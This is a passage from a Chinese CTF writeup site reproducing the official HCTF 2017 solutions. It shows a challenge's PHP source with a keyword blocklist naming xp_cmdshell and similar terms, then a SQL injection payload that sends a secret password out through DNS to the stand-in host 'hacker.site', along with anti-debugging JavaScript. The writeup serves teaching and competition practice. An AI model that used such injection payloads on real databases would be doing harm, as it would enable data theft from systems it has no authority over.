
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>2017HCTF · CTF Writeup</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Yunen <yunen@cqu.edu.cn>">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="2018qiangwang.html" />
    
    
    <link rel="prev" href="all.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="/" target="_blank" class="custom-link">首页</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    介绍
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../types/">
            
                <a href="../types/">
            
                    
                    按类型区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../types/web.html">
            
                <a href="../types/web.html">
            
                    
                    网上练习题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../types/comp.html">
            
                <a href="../types/comp.html">
            
                    
                    官方赛事题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../years/">
            
                <a href="../years/">
            
                    
                    按年份区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../years/2020.html">
            
                <a href="../years/2020.html">
            
                    
                    2019-2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../years/2019.html">
            
                <a href="../years/2019.html">
            
                    
                    2018-2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../years/2018.html">
            
                <a href="../years/2018.html">
            
                    
                    2017-2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../years/2017.html">
            
                <a href="../years/2017.html">
            
                    
                    2016-2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../years/2016.html">
            
                <a href="../years/2016.html">
            
                    
                    2015-2016
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../years/2015.html">
            
                <a href="../years/2015.html">
            
                    
                    ????-2015
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../difficult/">
            
                <a href="../difficult/">
            
                    
                    按难度区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../difficult/easy.html">
            
                <a href="../difficult/easy.html">
            
                    
                    相对简单
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../difficult/mid.html">
            
                <a href="../difficult/mid.html">
            
                    
                    难度中等
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../difficult/diff.html">
            
                <a href="../difficult/diff.html">
            
                    
                    难度较大
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="all.html">
            
                <a href="all.html">
            
                    
                    目前已收录
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.5.1" data-path="2017hctf.html">
            
                <a href="2017hctf.html">
            
                    
                    2017HCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="2018qiangwang.html">
            
                <a href="2018qiangwang.html">
            
                    
                    2018强网杯Web
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="2018ddctf.html">
            
                <a href="2018ddctf.html">
            
                    
                    2018DDCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="2019national.html">
            
                <a href="2019national.html">
            
                    
                    2019全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="2019ddctf.html">
            
                <a href="2019ddctf.html">
            
                    
                    2019DDCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="2017national.html">
            
                <a href="2017national.html">
            
                    
                    2017全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="2019xihulunjian.html">
            
                <a href="2019xihulunjian.html">
            
                    
                    2019西湖论剑预选赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="shiyanbar_web.html">
            
                <a href="shiyanbar_web.html">
            
                    
                    实验吧web部分
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../help.html">
            
                <a href="../help.html">
            
                    
                    加入我们完善网站!
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../reply.html">
            
                <a href="../reply.html">
            
                    
                    有问题?请在这里反馈!
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >2017HCTF</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#2017hctf"><b>1. </b>2017HCTF</a></li><ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><b>1.1. </b>&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</a></li></ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><b>2. </b>&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><b>3. </b>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><b>4. </b>&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</a></li><ul><li><span class="title-icon "></span><a href="#&#x524D;&#x8A00;"><b>4.1. </b>&#x524D;&#x8A00;:</a></li><li><span class="title-icon "></span><a href="#web"><b>4.2. </b>Web</a></li><ul><li><span class="title-icon "></span><a href="#easysignin"><b>4.2.1. </b>easy_sign_in</a></li><li><span class="title-icon "></span><a href="#boring-website"><b>4.2.2. </b>boring website</a></li><li><span class="title-icon "></span><a href="#babycrack"><b>4.2.3. </b>babycrack</a></li><li><span class="title-icon "></span><a href="#poker"><b>4.2.4. </b>poker</a></li><li><span class="title-icon "></span><a href="#poker-poker"><b>4.2.5. </b>poker-poker</a></li><li><span class="title-icon "></span><a href="#a-world-restored--a-world-restored-again"><b>4.2.6. </b>A World Restored &amp; A World Restored Again</a></li><li><span class="title-icon "></span><a href="#sql-silencer"><b>4.2.7. </b>SQL Silencer</a></li><li><span class="title-icon "></span><a href="#repeater"><b>4.2.8. </b>Repeater</a></li><li><span class="title-icon "></span><a href="#who-are-you"><b>4.2.9. </b>Who are you?</a></li><li><span class="title-icon "></span><a href="#deserted-place"><b>4.2.10. </b>Deserted place</a></li><li><span class="title-icon "></span><a href="#a-true-man-can-play-a-palo-one-hundred-time"><b>4.2.11. </b>A true man can play a palo one hundred time</a></li><li><span class="title-icon "></span><a href="#evrq"><b>4.2.12. </b>Evr_Q</a></li><li><span class="title-icon "></span><a href="#ezcrackme"><b>4.2.13. </b>ez_crackme</a></li><li><span class="title-icon "></span><a href="#guestbook"><b>4.2.14. </b>guestbook</a></li><li><span class="title-icon "></span><a href="#babyprintf"><b>4.2.15. </b>babyprintf</a></li><li><span class="title-icon "></span><a href="#aruok"><b>4.2.16. </b>ar_u_ok</a></li><li><span class="title-icon "></span><a href="#ippatsu-nyuukon"><b>4.2.17. </b>ippatsu-nyuukon</a></li><li><span class="title-icon "></span><a href="#babystack"><b>4.2.18. </b>babystack</a></li><li><span class="title-icon "></span><a href="#babyre"><b>4.2.19. </b>babyre</a></li><li><span class="title-icon "></span><a href="#rroopp"><b>4.2.20. </b>rroopp</a></li><li><span class="title-icon "></span><a href="#old-driver"><b>4.2.21. </b>old driver</a></li><li><span class="title-icon "></span><a href="#online-encryptor"><b>4.2.22. </b>online encryptor</a></li><li><span class="title-icon "></span><a href="#pokemon"><b>4.2.23. </b>pokemon</a></li><li><span class="title-icon "></span><a href="#newlovesong"><b>4.2.24. </b>New_Love_Song</a></li><li><span class="title-icon "></span><a href="#babyrsa"><b>4.2.25. </b>BabyRSA</a></li><li><span class="title-icon "></span><a href="#weakrsa"><b>4.2.26. </b>WeakRSA</a></li></ul></ul></ul></div><a href="#2017hctf" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="2017hctf"><a name="2017hctf" class="anchor-navigation-ex-anchor" href="#2017hctf"><i class="fa fa-link" aria-hidden="true"></i></a>1. 2017HCTF</h1>
<h2 id="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</h2>
<table>
<thead>
<tr>
<th style="text-align:center">&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x5E74;&#x4EFD;</th>
<th style="text-align:center">&#x96BE;&#x5EA6;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x5B98;&#x65B9;&#x8D5B;&#x4E8B;&#x9898;</td>
<td style="text-align:center">2017</td>
<td style="text-align:center">&#x96BE;</td>
</tr>
</tbody>
</table>
<h1 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>2. &#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h1>
<ul>
<li><a href="https://github.com/vidar-team/HCTF2017" target="_blank">https://github.com/vidar-team/HCTF2017</a></li>
</ul>
<h1 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>3. &#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</h1>
<ul>
<li><a href="https://xz.aliyun.com/t/1589" target="_blank">https://xz.aliyun.com/t/1589</a></li>
<li><a href="https://www.52pojie.cn/thread-662919-1-1.html" target="_blank">https://www.52pojie.cn/thread-662919-1-1.html</a></li>
</ul>
<h1 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><a name="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>4. &#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h1>
<p><strong>&#x5B98;&#x65B9;WP</strong></p>
<h2 id="&#x524D;&#x8A00;"><a name="&#x524D;&#x8A00;" class="anchor-navigation-ex-anchor" href="#&#x524D;&#x8A00;"><i class="fa fa-link" aria-hidden="true"></i></a>4.1. &#x524D;&#x8A00;:</h2>
<p>HCTF2017 Quals&#x5728;11&#x6708;12&#x65E5;&#x6B63;&#x5F0F;&#x843D;&#x4E0B;&#x5E37;&#x5E55;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x9AD8;&#x5174;HCTF&#x7684;&#x4E0D;&#x65AD;&#x8FDB;&#x6B65;&#x88AB;&#x4EBA;&#x4EEC;&#x770B;&#x5728;&#x773C;&#x91CC;&#xFF0C;HCTF2017&#x7B2C;&#x4E00;&#x6B21;&#x767B;&#x9646;CTFTIME&#xFF0C;<code>&#x53C2;&#x52A0;&#x6BD4;&#x8D5B;&#x5E76;&#x83B7;&#x5F97;&#x5206;&#x6570;&#x7684;&#x961F;&#x4F0D;&#x8D85;&#x8FC7;540&#x53EA;</code>&#x3002;</p>
<p>&#x4ECE;HCTF&#x521B;&#x529E;&#x4EE5;&#x6765;&#xFF0C;HCTF&#x4E00;&#x76F4;&#x8DF5;&#x884C;&#x7740;&#x505A;&#x66F4;&#x597D;&#x66F4;&#x68D2;&#x7684;CTF&#x6BD4;&#x8D5B;&#x7684;&#x51C6;&#x5219;&#xFF0C;&#x4ECE;2015&#x5E74;&#x7684;&#x53CD;&#x4F5C;&#x5F0A;&#x7CFB;&#x7EDF;&#x3001;&#x5168;&#x65B0;&#x7684;&#x6BD4;&#x8D5B;&#x673A;&#x5236;&#xFF0C;&#x5230;2016&#x5E74;&#x7684;&#x52A8;&#x6001;&#x79EF;&#x5206;&#x5236;&#xFF0C;HCTF&#x4E00;&#x76F4;&#x5728;&#x52AA;&#x529B;&#x5C06;CTF&#x53D8;&#x5F97;&#x66F4;&#x50CF;&#x4E00;&#x4E2A;hack game&#xFF01;</p>
<p>&#x4ECA;&#x5E74;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B21;&#x5F15;&#x5165;&#x4E86;&#x5206;&#x65B9;&#x5411;&#x7684;&#x95EF;&#x5173;&#x673A;&#x5236;&#xFF0C;&#x5C06;&#x6BD4;&#x8D5B;&#x9898;&#x76EE;&#x5206;&#x4E3A; bin&#x3001;web&#x548C; extra &#x4E09;&#x4E2A;&#x5927;&#x7C7B;&#xFF0C;&#x6BCF;&#x4E00;&#x5927;&#x7C7B;&#x6709;&#x4E94;&#x5173;&#xFF0C;&#x53EA;&#x6709;&#x6EE1;&#x8DB3;&#x6BCF;&#x5173;&#x7684;&#x5F00;&#x653E;&#x6761;&#x4EF6;&#xFF0C;&#x624D;&#x80FD;&#x5F00;&#x653E;&#x8BE5;&#x5173;&#x3002;</p>
<p>&#x5C3D;&#x7BA1;&#x89C4;&#x5219;&#x5BFC;&#x81F4;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x7ADF;&#x5982;&#x4EBA;&#x610F;&#xFF0C;&#x4F46;&#x6211;&#x4EEC;&#x4ECD;&#x7136;&#x8FDB;&#x6B65;&#xFF0C;HCTF&#x4ECD;&#x5728;&#x53D8;&#x5F97;&#x66F4;&#x597D;&#x3002;</p>
<h2 id="web"><a name="web" class="anchor-navigation-ex-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>4.2. Web</h2>
<h3 id="easysignin"><a name="easysignin" class="anchor-navigation-ex-anchor" href="#easysignin"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.1. easy_sign_in</h3>
<p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x771F;&#x7684;&#x771F;&#x7684;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x8FDE;&#x63D0;&#x793A;&#x90FD;&#x975E;&#x5E38;&#x7684;&#x660E;&#x663E;&#x5C31;&#x662F;&#x53BB;&#x67E5;&#x770B;&#x8BC1;&#x4E66;&#x7684;&#x5185;&#x5BB9;&#x3002; &#x4ECE;&#x8BC1;&#x4E66;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x6761;flag in: 123.206.81.217 &#x6216;&#x8BB8;&#x6709;&#x4E9B;&#x6D4F;&#x89C8;&#x5668;&#x663E;&#x793A;&#x7684;&#x4F4D;&#x7F6E;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x8FD9;&#x6837;. &#x6253;&#x5F00;123.206.81.217 &#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230; flag: hctf{s00000_e4sy_sign_in}</p>
<h3 id="boring-website"><a name="boring-website" class="anchor-navigation-ex-anchor" href="#boring-website"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.2. boring website</h3>
<p>&#x9996;&#x5148;&#x626B;&#x76EE;&#x5F55;&#x53D1;&#x73B0;&#x6709;www.zip,&#x4E0B;&#x8F7D;&#x5E76;&#x6253;&#x5F00;&#x53D1;&#x73B0;&#x662F;&#x6E90;&#x7801;</p>
<pre><code>&lt;?php
echo &quot;Bob received a mission to write a login system on someone else&apos;s serve
r, and he he only finished half of the work&lt;br /&gt;&quot;;
echo &quot;flag is hctf{what you get}&lt;br /&gt;&lt;br /&gt;&quot;;
error_reporting(E_ALL^E_NOTICE^E_WARNING);
try {
$conn = new PDO( &quot;sqlsrv:Server=*****;Database=not_here&quot;,&quot;oob&quot;, &quot;&quot;);
}
catch( PDOException $e ) {
die( &quot;Error connecting to SQL Server&quot;.$e-&gt;getMessage() );
}
#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;
echo &quot;Connected to SQL Server&lt;br /&gt;&quot;;
$id = $_GET\[&apos;id&apos;\];
if(preg_match(&apos;/EXEC|xp\_cmdshell|sp\_configure|xp_reg(.*)|CREATE|DROP|declare
|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i&apos;, $id)) {
die(&apos;NoNoNo&apos;);
}
$query = &quot;select message from not\_here\_too where id = $id&quot;; //link server: O
n linkname:mysql
$stmt = $conn-&gt;query( $query );
if ( @$row = $stmt-&gt;fetch( PDO::FETCH_ASSOC ) ){
//TO DO: ...
//It&apos;s time to sleep...
}
?&gt;
</code></pre><p>&#x53D1;&#x73B0;&#x5E94;&#x8BE5;&#x662F;<code>sql server</code>&#x7528;<code>linkserver</code>&#x6765;&#x8FDE;&#x63A5;<code>mysql</code>&#x3002;&#x6240;&#x4EE5;&#x53BB;&#x67E5;&#x4E86;&#x4E00;&#x6CE2;<code>linkserver</code>&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;&#x7ED3;&#x5408;&#x6CE8;&#x91CA;&#x53EF;&#x5F97;<code>select * from openquery(mysql,&apos;select xxx&apos;)</code>&#x53EF;&#x4EE5;&#x4ECE;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x5F97;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;sleep&#x51FD;&#x6570;&#x4E5F;&#x88AB;ban&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x5230;<code>oob</code>&#x7684;&#x63D0;&#x793A;&#xFF0C;&#x53BB;&#x67E5;&#x4E86;&#x4E00;&#x6CE2;<code>mysql out-of-band</code>&#xFF0C;&#x53D1;&#x73B0;<code>load_file</code>&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;dns&#x901A;&#x9053;&#x628A;&#x6240;&#x67E5;&#x5F97;&#x7684;&#x6570;&#x636E;&#x5E26;&#x51FA;&#x6765;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x8FC7;&#x7A0B;&#x5C31;&#x662F;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7B80;&#x5355;&#x7684;mysql&#x6CE8;&#x5165;&#x7684;&#x6D41;&#x7A0B;&#x3002;<br>&#x6700;&#x7EC8;&#x7684;payload: <code>/?id=1 union select * from openquery(mysql,&apos;select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.hacker.site\\a.txt&quot;))&apos;)</code></p>
<p>dnslog &#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x642D;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;ceye</p>
<p><a href="http://www.mottoin.com/96463.html" target="_blank">mysql out of band</a></p>
<h3 id="babycrack"><a name="babycrack" class="anchor-navigation-ex-anchor" href="#babycrack"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.3. babycrack</h3>
<pre><code>babycrack

Description 
just babycrack
1.flag.substr(-5,3)==&quot;333&quot;
2.flag.substr(-8,1)==&quot;3&quot;
3.Every word makes sence.
4.sha256(flag)==&quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot; 

Now Score 302.93
Team solved 45
</code></pre><p>&#x8FD8;&#x662F;&#x5F88;&#x62B1;&#x6B49;&#x9898;&#x76EE;&#x7684;&#x9A8C;&#x8BC1;&#x903B;&#x8F91;&#x8FD8;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x4E0D;&#x53EF;&#x9006;&#x63A8;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x88AB;&#x8FEB;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x9014;&#x52A0;&#x5165;4&#x4E2A;hint&#x6765;&#x4FEE;&#x590D;&#x95EE;&#x9898;&#xFF0C;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x6162;&#x6162;&#x770B;&#x770B;&#x4EE3;&#x7801;&#x3002;</p>
<p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x7531;&#x53CD;&#x8C03;&#x8BD5;+&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;+&#x903B;&#x8F91;&#x6DF7;&#x6DC6;3&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8BF4;&#x9898;&#x76EE;&#x6BEB;&#x65E0;&#x610F;&#x4E49;&#x5B8C;&#x5168;&#x4E3A;&#x4E86;&#x51FA;&#x9898;&#x800C;&#x51FA;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x786E;&#x5B9E;&#x6700;&#x6700;&#x771F;&#x5B9E;&#x7684;&#x524D;&#x7AEF;&#x4EE3;&#x7801;&#xFF0C;&#x73B0;&#x5728;&#x8BB8;&#x591A;&#x7AD9;&#x70B9;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x4F7F;&#x7528;&#x53CD;&#x8C03;&#x8BD5;+&#x6DF7;&#x6DC6;+&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x7684;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#x6765;&#x6DF7;&#x6DC6;&#x90E8;&#x5206;&#x524D;&#x7AEF;&#x4EE3;&#x7801;&#x3002;</p>
<p>&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x4E3B;&#x8981;&#x6709;&#x4E24;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;</p>
<p><a href="http://www.jianshu.com/p/9148d215c119" target="_blank">http://www.jianshu.com/p/9148d215c119</a><br><a href="https://zhuanlan.zhihu.com/p/29214928" target="_blank">https://zhuanlan.zhihu.com/p/29214928</a></p>
<p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x662F;&#x5728;&#x6211;&#x5206;&#x6790;chrome&#x62D3;&#x5C55;&#x540E;&#x95E8;&#x65F6;&#x5019;&#x6784;&#x601D;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x540C;&#x6837;&#x7ECF;&#x8FC7;&#x4E86;&#x5F88;&#x591A;&#x91CD;&#x7684;&#x6DF7;&#x6DC6;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x4E00;&#x6B65;&#x6B65;&#x89E3;&#x91CA;&#x3002;</p>
<h4 id="&#x53CD;&#x8C03;&#x8BD5;"><a name="&#x53CD;&#x8C03;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x53CD;&#x8C03;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x53CD;&#x8C03;&#x8BD5;" class="plugin-anchor" href="#&#x53CD;&#x8C03;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53CD;&#x8C03;&#x8BD5;</h4>
<p>&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x53CD;&#x8C03;&#x8BD5;&#xFF0C;&#x5F53;&#x5728;&#x9875;&#x9762;&#x5185;&#x4F7F;&#x7528;F12&#x6765;&#x8C03;&#x8BD5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4F1A;&#x5361;&#x6B7B;&#x5728;debugger&#x4EE3;&#x7801;&#x5904;&#x3002;<br>     <a href="http://static.zybuluo.com/LoRexxar/t1ve1pnu9lq3m99rzrlrq3vn/image.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/t1ve1pnu9lq3m99rzrlrq3vn/image.png" alt="">
     </a></p>
<p>&#x8FD9;&#x91CC;&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x8611;&#x83C7;&#x8857;&#x7684;&#x767B;&#x9646;&#x9A8C;&#x8BC1;&#x4EE3;&#x7801;&#x3002;<br>     <a href="http://static.zybuluo.com/LoRexxar/5u1n14snq6e3mzsld4id8jpp/image.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/5u1n14snq6e3mzsld4id8jpp/image.png" alt="">
     </a></p>
<p>&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<pre><code>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!&apos;&apos;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&apos;\\w+&apos;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p}(&apos;(3(){(3 a(){7{(3 b(2){9((\&apos;\&apos;+(2/2)).5!==1||2%g===0){(3(){}).8(\&apos;4\&apos;)()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();&apos;,17,17,&apos;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&apos;.split(&apos;|&apos;),0,{}));
</code></pre><p>&#x7F8E;&#x5316;&#x4E00;&#x4E0B;</p>
<pre><code>(function () {
    (function a() {
        try {
            (function b(i) {
                if ((&apos;&apos; + (i / i)).length !== 1 || i % 20 === 0) {
                    (function () {}).constructor(&apos;debugger&apos;)()
                } else {
                    debugger
                }
                b(++i)
            })(0)
        } catch (e) {
            setTimeout(a, 5000)
        }
    })()
})();
</code></pre><p>&#x8FD9;&#x5C31;&#x662F;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x53CD;&#x8C03;&#x8BD5;&#x3002;&#x6211;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;3&#x79CD;&#x529E;&#x6CD5;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x6B65;&#x3002;</p>
<p>1&#x3001;&#x4F7F;&#x7528;node&#x505A;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#x3002;<br>&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;debugger&#x68C0;&#x6D4B;&#x7684;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x8C03;&#x8BD5;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x5BF9;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#x5C31;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
